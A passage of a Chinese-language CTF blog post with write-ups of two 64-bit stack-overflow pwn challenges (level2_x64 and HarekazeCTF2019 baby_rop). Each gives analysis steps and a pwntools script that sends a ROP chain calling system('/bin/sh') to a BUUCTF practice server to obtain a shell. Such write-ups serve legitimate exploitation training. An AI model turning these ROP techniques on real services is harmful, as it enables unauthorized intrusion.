+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 161637.png)</p>
+<p>ida分析，发现栈溢出</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 161830.png)</p>
+<p>&#x2F;bin&#x2F;sh字符串地址，0x600A90</p>
+<p>system地址，0x4004C0</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 161923.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 162118.png)</p>
+<p>偏移，0x80+8</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 162339.png)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28794</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4004C0</span></span><br><span class="line">bin_sh = <span class="number">0x600A90</span></span><br><span class="line">rdi = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="11-HarekazeCTF2019-baby-rop"><a href="#11-HarekazeCTF2019-baby-rop" class="headerlink" title="11.[HarekazeCTF2019]baby_rop"></a>11.[HarekazeCTF2019]baby_rop</h3><p>查看保护，64位，动态链接，NX保护</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 145901.png)</p>
+<p>ida分析，进入main函数，未发现任何漏洞，但scanf未限制输入长度，这里可以制造使v4溢出</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 150325.png)</p>
+<p>寻找system和&#x2F;bin&#x2F;sh</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 150755.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 150854.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 151018.png)</p>
+<p>由于是64位，故需寄存器传参，即rdi</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 151530.png)</p>
+<p>偏移量</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 150307.png)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26548</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x601048</span></span><br><span class="line">system = <span class="number">0x400490</span></span><br><span class="line">rdi_ret = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到控制权后，发现flag不在桌面上，而位于&#x2F;home&#x2F;babyrop&#x2F;flag中</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-30 152732.png)</p>
+
+  </div>
+  
+</div>
+          </div>
+        </div>
+
+        <link rel="stylesheet" href="/css/footer.css">
+<div class="bottom-outer">
+  <div class="copyright">©2021 - 2021 By Tanger</div>
+  <div class="framework-info">
+    <span>Power by</span>
+    <a class="a1" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    <span class="footer-separator">|</span>
+    <span>Theme by</span>
+    <a class="a2" target="_blank" rel="noopener" href="https://github.com/redhat123456/hexo-theme-MiHoYo">MiHoYo</a>
+  </div>
+</div>
+
+          
+            <!-- scripts list from theme config.yml -->
+            
+              <script src="/js/MiHoYo.js"></script>
+              
+                
+
+  </body>
+
+  </html>
